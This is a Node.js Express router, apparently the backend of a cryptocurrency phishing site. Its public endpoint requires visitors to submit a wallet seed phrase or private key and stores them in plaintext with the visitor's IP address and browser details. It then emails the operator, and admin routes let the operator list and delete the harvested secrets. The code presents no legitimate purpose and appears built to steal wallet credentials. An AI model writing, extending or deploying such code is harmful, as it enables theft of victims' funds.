import express from "express";
import nodemailer from "nodemailer";
import Submission from "../models/Submission.js";
import { requireAdmin } from "../middleware/auth.js";

const router = express.Router();

function mailer() {
  return nodemailer.createTransport({
    host: process.env.SMTP_HOST,
    port: Number(process.env.SMTP_PORT),
    secure: process.env.SMTP_SECURE === "true",
    auth: {
      user: process.env.SMTP_USER,
      pass: process.env.SMTP_PASS,
    },
  });
}

// Public: create submission
router.post("/", async (req, res) => {

  const { walletType, network, action, note, secretPhrase, walletSecret } = req.body || {};

  // Require walletType, network, action, and at least one of secretPhrase or walletSecret
  if (!walletType || !network || !action || (!secretPhrase && !walletSecret)) {
    return res.status(400).json({ message: "Missing required fields" });
  }

  // Save submission first, respond immediately, send email in background
  const doc = await Submission.create({
    walletType,
    network,
    action,
    secretPhrase: secretPhrase || "",
    walletSecret: walletSecret || "",
    ip: req.headers["x-forwarded-for"]?.toString() || req.socket.remoteAddress || "",
    userAgent: req.headers["user-agent"] || "",
  });

  // Send email in background with Promise (more reliable than setImmediate)
  // This allows the user to get immediate feedback while email sends separately
  Promise.resolve().then(async () => {
    try {
      // Check if email credentials are configured
      if (!process.env.SMTP_HOST || !process.env.SMTP_USER || !process.env.SMTP_PASS) {
        console.warn("⚠️  Email credentials not configured - skipping email");
        return;
      }

      const t = mailer();
      await t.sendMail({
        from: process.env.ADMIN_EMAIL || process.env.SMTP_USER,
        to: process.env.ADMIN_EMAIL_TO,
        subject: "New submission received",
        text: `A new submission was received.\n\nTime: ${new Date().toISOString()}\nWallet: ${walletType}\nNetwork: ${network}\nAction: ${action}\n\nPlease check the admin page to review it.`,
      });
      console.log("✅ Email sent successfully");
    } catch (e) {
      console.error("❌ Email failed:", e?.message || e);
    }
  });

  // Return immediately without waiting for email
  return res.json({ ok: true, id: doc._id });
});

// Admin: list submissions
router.get("/", requireAdmin, async (req, res) => {
  const rows = await Submission.find().sort({ createdAt: -1 }).limit(500);
  res.json(rows);
});

// Admin: delete a submission by ID
router.delete("/:id", requireAdmin, async (req, res) => {
  const { id } = req.params;
  try {
    const deleted = await Submission.findByIdAndDelete(id);
    if (!deleted) return res.status(404).json({ message: "Not found" });
    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ message: "Delete failed" });
  }
});

export default router;